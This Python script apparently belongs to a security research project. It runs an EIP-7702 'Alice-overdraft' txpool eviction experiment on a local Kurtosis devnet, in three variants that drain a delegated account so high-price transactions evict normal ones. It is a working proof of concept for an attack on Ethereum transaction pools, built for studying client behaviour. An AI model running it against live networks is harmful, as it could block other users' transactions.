#!/usr/bin/env python3
"""
EIP-7702 variant of MPFUZZ-style experiment 5 on the Kurtosis PoS devnet.

This case tests the advisor's Alice-overdraft idea:

  1. Alice is funded with a small fixed balance.
  2. A 7702 set-code transaction delegates Alice to Alice7702Drain.
  3. Low-price A transactions fill the txpool.
  4. In alice-sender mode, high-price X1-X4 transactions are sent from Alice to
     Alice with tx.value=0. X1 drains Alice, and X2-X4 have no receipts once
     Alice can no longer cover their upfront gas cap.
  5. In alice-helper mode, high-price X1-X4 transactions are sent from Alice to
     a third-party trigger helper. The helper calls Alice's delegated
     drainAll(x), making the top-level tx.to different from Alice while the
     value still moves out of Alice's account context.
  6. In bob-trigger mode, high-price type-2 transactions are sent from Bob to
     Alice with tx.value=0 and empty calldata. Bob is a normal sender, so the
     7702 delegated-account in-flight check does not count Alice as the txpool
     sender or as a 7702 authority. The calls trigger Alice's delegated fallback
     during execution.
"""

import argparse
import re
import subprocess
import sys
import time
from pathlib import Path

import mp_exp5_pos as base


ETHER = 10**18


def parse_args():
    parser = argparse.ArgumentParser(description="Run exp5 EIP-7702 Alice-overdraft case on a Kurtosis PoS devnet.")
    parser.add_argument(
        "--case",
        choices=["alice-sender", "alice-helper", "bob-trigger"],
        default="alice-sender",
        help=(
            "alice-sender sends X1-X4 from Alice to Alice; alice-helper sends X1-X4 "
            "from Alice to a third-party helper that calls Alice; bob-trigger sends normal type-2 "
            "Bob->Alice transactions with empty calldata to trigger Alice's delegated fallback."
        ),
    )
    parser.add_argument("--rpc", default=None, help="EL HTTP RPC URL. Defaults to Kurtosis discovery.")
    parser.add_argument("--enclave", default="geth-lighthouse-devnet")
    parser.add_argument("--price-unit", type=int, default=1_000_000_000)
    parser.add_argument("--setup-price", type=int, default=10)
    parser.add_argument("--normal-price", type=int, default=3)
    parser.add_argument("--attacker-price", type=int, default=7)
    parser.add_argument("--alice-balance-eth", type=int, default=10)
    parser.add_argument("--normal-fund-eth", type=int, default=100)
    parser.add_argument("--alice-gas-cap-eth", type=int, default=2)
    parser.add_argument("--deploy-gas", type=int, default=2_000_000)
    parser.add_argument("--setcode-gas", type=int, default=250_000)
    parser.add_argument("--call-gas", type=int, default=500_000)
    parser.add_argument("--receipt-timeout", type=int, default=180)
    parser.add_argument("--fresh-block-timeout", type=int, default=30)
    parser.add_argument("--solc-version", default="0.8.20")
    parser.add_argument("--evm-version", default="london")
    parser.add_argument("--go-binary", default="/usr/local/go/bin/go", help="Go binary used to run the 7702 set-code helper.")
    parser.add_argument("--post-block-wait", type=int, default=2)
    return parser.parse_args()


def checksum(w3, address):
    return base.checksum_address(w3, address)


def workload_price_unit(args):
    denominator = args.attacker_price * args.call_gas
    if denominator <= 0:
        raise RuntimeError("attacker price and call gas must be positive")
    unit = (args.alice_gas_cap_eth * ETHER) // denominator
    if unit <= 0:
        raise RuntimeError("computed EIP-7702 workload price unit is zero")
    return unit


def drain_all_calldata(receiver):
    data = base.bytes_from_hex(base.selector("drainAll(address)")) + base.abi_address(receiver)
    return "0x" + data.hex()


def trigger_drain_calldata(alice, receiver):
    data = (
        base.bytes_from_hex(base.selector("trigger(address,address)"))
        + base.abi_address(alice)
        + base.abi_address(receiver)
    )
    return "0x" + data.hex()


def sign_eip1559_tx_with_data(private_key_hex, chain_id, nonce, fee_cap, tip_cap, gas_limit, to_address, value, data):
    private_key = int(private_key_hex.removeprefix("0x"), 16)
    access_list = []
    signing_parts = [
        chain_id,
        nonce,
        tip_cap,
        fee_cap,
        gas_limit,
        base.bytes_from_hex(to_address),
        value,
        base.bytes_from_hex(data),
        access_list,
    ]
    signing_hash = base.keccak256(b"\x02" + base.rlp_encode(signing_parts))
    y_parity, r, s = base.sign_digest(private_key, signing_hash)
    raw_payload = base.rlp_encode(signing_parts + [y_parity, r, s])
    raw = b"\x02" + raw_payload
    return "0x" + raw.hex(), "0x" + base.keccak256(raw).hex()


def send_type2(rpc, chain_id, accounts, tx, price_unit):
    account = accounts[tx.sender_label]
    fee = tx.price * price_unit
    raw, expected_hash = sign_eip1559_tx_with_data(
        account["private_key"],
        chain_id,
        tx.nonce,
        fee,
        fee,
        tx.gas_limit,
        tx.to_address,
        tx.value,
        tx.data,
    )
    try:
        tx.hash = rpc.call("eth_sendRawTransaction", [raw])
        print(f"sent: {tx.label:<28} hash={tx.hash}")
        if tx.hash.lower() != expected_hash.lower():
            print(f"warning: local hash {expected_hash} differs from RPC hash {tx.hash}")
    except base.RpcError as exc:
        tx.hash = expected_hash
        tx.error = str(exc)
        print(f"rejected: {tx.label:<24} err={tx.error}")
    return tx


def wait_fresh_block(rpc, timeout):
    start = base.hex_to_int(rpc.call("eth_blockNumber"))
    deadline = time.time() + timeout
    print(f"waiting for a fresh PoS block after {start}")
    while time.time() < deadline:
        current = base.hex_to_int(rpc.call("eth_blockNumber"))
        if current > start:
            print(f"freshBlock={current}")
            return current
        time.sleep(0.25)
    raise RuntimeError(f"no fresh block after {timeout}s")


def fund_to_target(rpc, chain_id, accounts, args):
    funder = accounts[base.DEFAULT_FUNDER["label"]]
    alice = accounts["a"]
    normal = accounts["x"]
    funder_nonce = base.hex_to_int(rpc.call("eth_getTransactionCount", [funder["address"], "pending"]))

    alice_target = args.alice_balance_eth * ETHER
    alice_balance = base.balance(rpc, alice["address"])
    if alice_balance > alice_target:
        raise RuntimeError(
            f"Alice already has {alice_balance} wei, above target {alice_target}. "
            "Restart the devnet before running the 7702 overdraft case."
        )

    txs = []
    if alice_balance < alice_target:
        txs.append(
            base.Tx(
                "fund Alice to 7702 target",
                funder["label"],
                funder["address"],
                funder_nonce,
                args.setup_price,
                21_000,
                alice["address"],
                alice_target - alice_balance,
            )
        )
        funder_nonce += 1

    normal_target = args.normal_fund_eth * ETHER
    normal_balance = base.balance(rpc, normal["address"])
    if normal_balance < normal_target:
        txs.append(
            base.Tx(
                "fund normal sender",
                funder["label"],
                funder["address"],
                funder_nonce,
                args.setup_price,
                21_000,
                normal["address"],
                normal_target - normal_balance,
            )
        )

    print("\n========== setup: fund Alice and normal sender ==========")
    if not txs:
        print("funding skipped: balances already at or above targets")
        return
    for tx in txs:
        base.send(rpc, chain_id, accounts, tx, args.price_unit)
    base.wait_targets(rpc, txs, args.receipt_timeout)


def delegate_contract_spec(args):
    if args.case == "bob-trigger":
        return "Alice7702FallbackDrain.sol", "Alice7702FallbackDrain"
    return "Alice7702Drain.sol", "Alice7702Drain"


def deploy_delegate(rpc, chain_id, accounts, args):
    try:
        from web3 import Web3
    except ModuleNotFoundError as exc:
        raise RuntimeError(
            "Install Web3.py deployment dependencies with:\n"
            "  python3 -m pip install web3 py-solc-x\n"
            f"  python3 -c \"from solcx import install_solc; install_solc('{args.solc_version}')\""
        ) from exc

    exp_dir = Path(__file__).resolve().parent
    source_file, contract_name = delegate_contract_spec(args)
    source_path = exp_dir / source_file
    source = source_path.read_text(encoding="utf-8")
    interface = base.compile_with_solc(source, contract_name, args.solc_version, args.evm_version)
    bytecode = interface.get("bin") or interface.get("bytecode")
    if not bytecode:
        raise RuntimeError("compiled Alice7702Drain did not include deployment bytecode")
    if not bytecode.startswith("0x"):
        bytecode = "0x" + bytecode

    w3 = Web3(Web3.HTTPProvider(args.rpc_url))
    deployer = accounts[base.DEFAULT_FUNDER["label"]]
    deployer_account = w3.eth.account.from_key(deployer["private_key"])
    base.add_signing_middleware(w3, deployer_account)
    deployer_address = checksum(w3, deployer["address"])
    if hasattr(w3.eth, "default_account"):
        w3.eth.default_account = deployer_address
    else:
        w3.eth.defaultAccount = deployer_address

    nonce = base.hex_to_int(rpc.call("eth_getTransactionCount", [deployer["address"], "pending"]))
    contract = w3.eth.contract(abi=interface["abi"], bytecode=bytecode)
    tx_params = {
        "from": deployer_address,
        "value": 0,
        "gas": args.deploy_gas,
        "gasPrice": args.setup_price * args.price_unit,
        "nonce": nonce,
        "chainId": chain_id,
    }

    print(f"\n========== setup: deploy {contract_name} implementation ==========")
    print(f"source={source_path}")
    print(f"solcVersion={args.solc_version} evmVersion={args.evm_version}")
    if args.case == "bob-trigger":
        receiver = checksum(w3, accounts["x"]["address"])
        print(f"fallbackReceiver={accounts['x']['address']}")
        tx_hash = contract.constructor(receiver).transact(tx_params)
    else:
        tx_hash = contract.constructor().transact(tx_params)
    tx_hash_hex = tx_hash.hex() if hasattr(tx_hash, "hex") else str(tx_hash)
    if not tx_hash_hex.startswith("0x"):
        tx_hash_hex = "0x" + tx_hash_hex
    tx = base.Tx(f"deploy {contract_name}", deployer["label"], deployer["address"], nonce, args.setup_price, args.deploy_gas)
    tx.hash = tx_hash_hex
    print(f"sent: {tx.label:<28} hash={tx.hash}")
    base.wait_targets(rpc, [tx], args.receipt_timeout)
    if tx.receipt.get("status") != "0x1" or not tx.receipt.get("contractAddress"):
        raise RuntimeError(f"{contract_name} deployment failed")
    delegate = tx.receipt["contractAddress"]
    print(f"delegate={delegate}")
    return delegate


def deploy_trigger_helper(rpc, chain_id, accounts, args):
    if args.case != "alice-helper":
        return None
    try:
        from web3 import Web3
    except ModuleNotFoundError as exc:
        raise RuntimeError(
            "Install Web3.py deployment dependencies with:\n"
            "  python3 -m pip install web3 py-solc-x\n"
            f"  python3 -c \"from solcx import install_solc; install_solc('{args.solc_version}')\""
        ) from exc

    exp_dir = Path(__file__).resolve().parent
    source_path = exp_dir / "Alice7702DrainTrigger.sol"
    source = source_path.read_text(encoding="utf-8")
    interface = base.compile_with_solc(source, "Alice7702DrainTrigger", args.solc_version, args.evm_version)
    bytecode = interface.get("bin") or interface.get("bytecode")
    if not bytecode:
        raise RuntimeError("compiled Alice7702DrainTrigger did not include deployment bytecode")
    if not bytecode.startswith("0x"):
        bytecode = "0x" + bytecode

    w3 = Web3(Web3.HTTPProvider(args.rpc_url))
    deployer = accounts[base.DEFAULT_FUNDER["label"]]
    deployer_account = w3.eth.account.from_key(deployer["private_key"])
    base.add_signing_middleware(w3, deployer_account)
    deployer_address = checksum(w3, deployer["address"])
    if hasattr(w3.eth, "default_account"):
        w3.eth.default_account = deployer_address
    else:
        w3.eth.defaultAccount = deployer_address

    nonce = base.hex_to_int(rpc.call("eth_getTransactionCount", [deployer["address"], "pending"]))
    contract = w3.eth.contract(abi=interface["abi"], bytecode=bytecode)
    tx_params = {
        "from": deployer_address,
        "value": 0,
        "gas": args.deploy_gas,
        "gasPrice": args.setup_price * args.price_unit,
        "nonce": nonce,
        "chainId": chain_id,
    }

    print("\n========== setup: deploy Alice7702DrainTrigger helper ==========")
    print(f"source={source_path}")
    tx_hash = contract.constructor().transact(tx_params)
    tx_hash_hex = tx_hash.hex() if hasattr(tx_hash, "hex") else str(tx_hash)
    if not tx_hash_hex.startswith("0x"):
        tx_hash_hex = "0x" + tx_hash_hex
    tx = base.Tx("deploy Alice7702DrainTrigger", deployer["label"], deployer["address"], nonce, args.setup_price, args.deploy_gas)
    tx.hash = tx_hash_hex
    print(f"sent: {tx.label:<28} hash={tx.hash}")
    base.wait_targets(rpc, [tx], args.receipt_timeout)
    if tx.receipt.get("status") != "0x1" or not tx.receipt.get("contractAddress"):
        raise RuntimeError("Alice7702DrainTrigger deployment failed")
    helper = tx.receipt["contractAddress"]
    print(f"triggerHelper={helper}")
    return helper


def run_set_code(rpc, accounts, args, delegate):
    exp_dir = Path(__file__).resolve().parent
    repo_root = exp_dir.parents[1]
    helper = "./devtools/mpfuzz_style_exp5_pos/eip7702_tx_helper.go"
    funder = accounts[base.DEFAULT_FUNDER["label"]]
    alice = accounts["a"]
    setcode_to = alice["address"] if args.case == "alice-sender" else funder["address"]
    gas_fee_cap = args.setup_price * args.price_unit
    cmd = [
        args.go_binary,
        "run",
        helper,
        "--rpc",
        args.rpc_url,
        "--sponsor-key",
        funder["private_key"],
        "--authority-key",
        alice["private_key"],
        "--delegate-address",
        delegate,
        "--to",
        setcode_to,
        "--gas",
        str(args.setcode_gas),
        "--gas-fee-cap-wei",
        str(gas_fee_cap),
        "--gas-tip-cap-wei",
        str(gas_fee_cap),
    ]
    print("\n========== setup: EIP-7702 delegate Alice ==========")
    print(f"setCodeTxTo={setcode_to}")
    output = subprocess.check_output(cmd, cwd=repo_root, text=True)
    print(output.rstrip())
    match = re.search(r"hash=(0x[0-9a-fA-F]+)", output)
    if not match:
        raise RuntimeError("set-code helper did not print a tx hash")
    tx_hash = match.group(1)
    receipt = base.wait_receipt(rpc, tx_hash, args.receipt_timeout)
    if not receipt:
        raise RuntimeError(f"no receipt for set-code tx: {tx_hash}")
    print(
        "receipt: set-code Alice delegation "
        f"status={receipt.get('status')} block={base.hex_to_int(receipt.get('blockNumber'))} "
        f"txIndex={base.hex_to_int(receipt.get('transactionIndex'))} gasUsed={base.hex_to_int(receipt.get('gasUsed'))}"
    )
    if receipt.get("status") != "0x1":
        raise RuntimeError("set-code transaction failed")

    code = rpc.call("eth_getCode", [alice["address"], "latest"])
    print(f"aliceCode={code}")
    if not code.lower().startswith("0xef0100"):
        raise RuntimeError("Alice does not have an EIP-7702 delegation indicator after set-code")


def build_normal(accounts, start_nonce, price):
    normal = accounts["x"]
    return [
        base.Tx(f"A{index + 1} normal price={price}", "x", normal["address"], start_nonce + index, price, 21_000, normal["address"], 1)
        for index in range(4)
    ]


def build_7702_attacker(accounts, start_nonce, price, call_gas):
    alice = accounts["a"]
    receiver = accounts["x"]
    data = drain_all_calldata(receiver["address"])
    return [
        base.Tx(
            f"X{index + 1} 7702 drainAll tx.value=0 price={price}",
            "a",
            alice["address"],
            start_nonce + index,
            price,
            call_gas,
            alice["address"],
            0,
            data,
        )
        for index in range(4)
    ]


def build_7702_helper_attacker(accounts, start_nonce, price, call_gas, helper):
    alice = accounts["a"]
    receiver = accounts["x"]
    data = trigger_drain_calldata(alice["address"], receiver["address"])
    return [
        base.Tx(
            f"X{index + 1} Alice->helper trigger drainAll price={price}",
            "a",
            alice["address"],
            start_nonce + index,
            price,
            call_gas,
            helper,
            0,
            data,
        )
        for index in range(4)
    ]


def build_bob_trigger_attacker(accounts, start_nonce, price, call_gas):
    bob = accounts[base.DEFAULT_FUNDER["label"]]
    alice = accounts["a"]
    return [
        base.Tx(
            f"X{index + 1} Bob->Alice fallback type=2 price={price}",
            bob["label"],
            bob["address"],
            start_nonce + index,
            price,
            call_gas,
            alice["address"],
            0,
            "0x",
        )
        for index in range(4)
    ]


def labels_at(txs, locations, location):
    return [tx.label for tx in txs if base.location_of(tx, locations) == location]


def print_pool_result(args, normal, attacker, locations):
    normal_pending = labels_at(normal, locations, "pending")
    attacker_pending = labels_at(attacker, locations, "pending")
    attacker_queued = labels_at(attacker, locations, "queued")
    if args.case == "bob-trigger":
        print("\nresult: txpool state after Bob->Alice X1-X4 type-2 fallback trigger calls")
    elif args.case == "alice-helper":
        print("\nresult: txpool state after Alice->helper X1-X4 trigger-drain calls")
    else:
        print("\nresult: txpool state after EIP-7702 X1-X4 tx.value=0 drain calls")
    print(f"  normal pending: {normal_pending}")
    print(f"  attacker pending: {attacker_pending}")
    print(f"  attacker queued: {attacker_queued}")
    if len(attacker_pending) == 4 and not normal_pending and not attacker_queued:
        if args.case == "bob-trigger":
            print("PASS: txpool accepted all high-price Bob->Alice fallback trigger transactions and evicted A1-A4")
        elif args.case == "alice-helper":
            print("PASS: txpool accepted all high-price Alice->helper trigger transactions and evicted A1-A4")
        else:
            print("PASS: txpool accepted all high-price 7702 Alice-overdraft transactions and evicted A1-A4")
    else:
        print("CHECK: txpool state differs from the full-overdraft-eviction pattern")


def print_execution_result(normal, attacker, rpc, accounts, args, price_unit):
    for tx in attacker:
        if tx.hash and not tx.receipt:
            tx.receipt = rpc.call("eth_getTransactionReceipt", [tx.hash])
    normal_receipts = [rpc.call("eth_getTransactionReceipt", [tx.hash]) for tx in normal]
    x_statuses = [tx.receipt.get("status") if tx.receipt else None for tx in attacker]
    alice_balance = base.balance(rpc, accounts["a"]["address"])
    receiver_balance = base.balance(rpc, accounts["x"]["address"])
    next_upfront = args.attacker_price * price_unit * args.call_gas
    if args.case == "bob-trigger":
        print("\nresult: EIP-7702 Bob-trigger fallback execution state")
    elif args.case == "alice-helper":
        print("\nresult: EIP-7702 Alice-helper trigger execution state")
    else:
        print("\nresult: EIP-7702 Alice-overdraft execution state")
    print(f"  X receipt statuses: {x_statuses}")
    print(f"  A receipts: {[receipt is not None for receipt in normal_receipts]}")
    print(f"  aliceBalanceWei={alice_balance}")
    print(f"  receiverBalanceWei={receiver_balance}")
    print(f"  nextXUpfrontCostWei={next_upfront}")
    if args.case == "bob-trigger" and x_statuses == ["0x1", "0x0", "0x0", "0x0"] and all(receipt is None for receipt in normal_receipts):
        print("PASS: Bob-trigger X1 drained Alice via delegated fallback; X2-X4 reverted on-chain after Alice was empty")
    elif args.case == "alice-helper" and x_statuses == ["0x1", None, None, None] and alice_balance < next_upfront:
        print("PASS: Alice->helper X1 triggered delegated drain; X2-X4 have no receipts after Alice overdraft")
    elif x_statuses == ["0x1", None, None, None] and alice_balance < next_upfront:
        print("PASS: X1 drained Alice through delegated code; X2-X4 have no receipts after Alice overdraft")
    elif x_statuses[0] == "0x1" and x_statuses[1:] == ["0x0", "0x0", "0x0"]:
        print("CHECK: 7702 delegated debit worked, but X2-X4 reverted on-chain instead of being skipped")
    else:
        print("CHECK: execution statuses differ from the expected EIP-7702 Alice-overdraft pattern")


def main():
    args = parse_args()
    rpc_url = args.rpc or base.discover_kurtosis_rpc(args.enclave)
    args.rpc_url = rpc_url
    exp_dir = Path(__file__).resolve().parent
    accounts = base.load_key_csv(exp_dir / "key_prive_exp5.csv")
    rpc = base.RpcClient(rpc_url)
    chain_id = base.hex_to_int(rpc.call("eth_chainId"))
    client = rpc.call("web3_clientVersion")
    price_unit = workload_price_unit(args)

    print(f"RPC: {rpc_url}")
    print(f"client={client}")
    print(f"chainId={chain_id}")
    print(f"case=eip7702-{args.case}")
    print(f"workloadPriceUnitWei={price_unit}")
    print(f"aliceGasCapWei={args.alice_gas_cap_eth * ETHER}")
    print("accounts before setup:")
    for label in (base.DEFAULT_FUNDER["label"], "a", "x"):
        account = accounts[label]
        print(f"  {label:<7} {account['address']} balanceWei={base.balance(rpc, account['address'])}")
    if args.case == "bob-trigger":
        print(f"bob={base.DEFAULT_FUNDER['label']} {accounts[base.DEFAULT_FUNDER['label']]['address']}")

    status = rpc.call("txpool_status")
    if base.hex_to_int(status["pending"]) or base.hex_to_int(status["queued"]):
        print(f"warning: txpool is not empty before setup: {status}")

    fund_to_target(rpc, chain_id, accounts, args)
    delegate = deploy_delegate(rpc, chain_id, accounts, args)
    run_set_code(rpc, accounts, args, delegate)
    trigger_helper = deploy_trigger_helper(rpc, chain_id, accounts, args)

    print("\naccounts after 7702 setup:")
    for label in ("a", "x"):
        account = accounts[label]
        print(f"  {label:<7} {account['address']} balanceWei={base.balance(rpc, account['address'])}")

    wait_fresh_block(rpc, args.fresh_block_timeout)
    normal_start_nonce = base.hex_to_int(rpc.call("eth_getTransactionCount", [accounts["x"]["address"], "pending"]))
    alice_start_nonce = base.hex_to_int(rpc.call("eth_getTransactionCount", [accounts["a"]["address"], "pending"]))
    bob_start_nonce = base.hex_to_int(rpc.call("eth_getTransactionCount", [accounts[base.DEFAULT_FUNDER["label"]]["address"], "pending"]))
    normal = build_normal(accounts, normal_start_nonce, args.normal_price)
    if args.case == "bob-trigger":
        attacker = build_bob_trigger_attacker(accounts, bob_start_nonce, args.attacker_price, args.call_gas)
    elif args.case == "alice-helper":
        attacker = build_7702_helper_attacker(accounts, alice_start_nonce, args.attacker_price, args.call_gas, trigger_helper)
    else:
        attacker = build_7702_attacker(accounts, alice_start_nonce, args.attacker_price, args.call_gas)
    known = []

    print("\n========== workload: send A1-A4 then X1-X4 before next PoS slot ==========")
    print(f"aliceStartNonceAfterDelegation={alice_start_nonce}")
    if args.case == "bob-trigger":
        print(f"bobStartNonce={bob_start_nonce}")
    print(f"normalStartNonce={normal_start_nonce}")
    for tx in normal:
        known.append(base.send(rpc, chain_id, accounts, tx, price_unit))
    locations = base.snapshot(rpc, "after filling A1-A4 price=3", known)

    for tx in attacker:
        if args.case == "bob-trigger":
            known.append(send_type2(rpc, chain_id, accounts, tx, price_unit))
        else:
            known.append(base.send(rpc, chain_id, accounts, tx, price_unit))
    snapshot_label = (
        "after X1-X4 Bob->Alice fallback type=2 tx.value=0 price=7"
        if args.case == "bob-trigger"
        else "after X1-X4 Alice->helper trigger-drain tx.value=0 price=7"
        if args.case == "alice-helper"
        else "after X1-X4 EIP-7702 drainAll tx.value=0 price=7"
    )
    locations = base.snapshot(rpc, snapshot_label, known)
    print_pool_result(args, normal, attacker, locations)

    print("\n========== wait for PoS receipts ==========")
    if args.case == "bob-trigger":
        base.wait_targets(rpc, attacker, args.receipt_timeout)
    else:
        base.wait_targets(rpc, [attacker[0]], args.receipt_timeout)
    time.sleep(args.post_block_wait)
    base.snapshot(rpc, "after EIP-7702 Alice-overdraft block production", known)
    print_execution_result(normal, attacker, rpc, accounts, args, price_unit)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
